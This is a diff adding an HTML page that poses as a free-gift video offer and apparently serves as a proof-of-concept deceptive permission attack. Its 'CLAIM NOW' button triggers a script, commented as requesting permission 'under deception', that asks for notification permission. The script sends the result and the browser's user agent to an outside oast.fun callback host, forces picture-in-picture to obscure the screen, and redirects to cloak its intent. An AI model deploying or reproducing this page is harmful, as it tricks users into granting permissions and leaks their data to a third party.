@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Your Free Gift!</title>
+  <style>
+    body { text-align: center; font-family: sans-serif; }
+    .fake-video { width: 400px; height: 300px; background: black; margin-top: 50px; position: relative; }
+    .claim-btn {
+      position: absolute;
+      top: 120px; left: 100px;
+      padding: 15px 30px;
+      background: yellow; border: none;
+      font-size: 16px;
+      cursor: pointer;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 Watch & Claim Your Bonus!</h1>
+  <p>Watch this short video and claim your reward.</p>
+
+  <div class="fake-video">
+    <video id="baitVideo" width="400" height="300" autoplay muted playsinline>
+      <source src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" type="video/mp4">
+    </video>
+    <button class="claim-btn" onclick="trigger()">CLAIM NOW</button>
+  </div>
+
+  <script>
+    async function trigger() {
+      // Request permission under deception
+      try {
+        Notification.requestPermission().then(result => {
+          fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/notify-deception', {
+            method: 'POST',
+            body: JSON.stringify({ permission: result, ua: navigator.userAgent }),
+            headers: { 'Content-Type': 'application/json' }
+          });
+        });
+      } catch (e) {}
+
+      // Force PiP to obscure
+      const video = document.getElementById('baitVideo');
+      if (document.pictureInPictureEnabled) {
+        await video.requestPictureInPicture();
+      }
+
+      // Optional redirect to cloak intent
+      setTimeout(() => {
+        location.href = 'https://www.google.com/search?q=thank+you+for+claiming';
+      }, 2500);
+    }
+  </script>
+</body>
+</html>
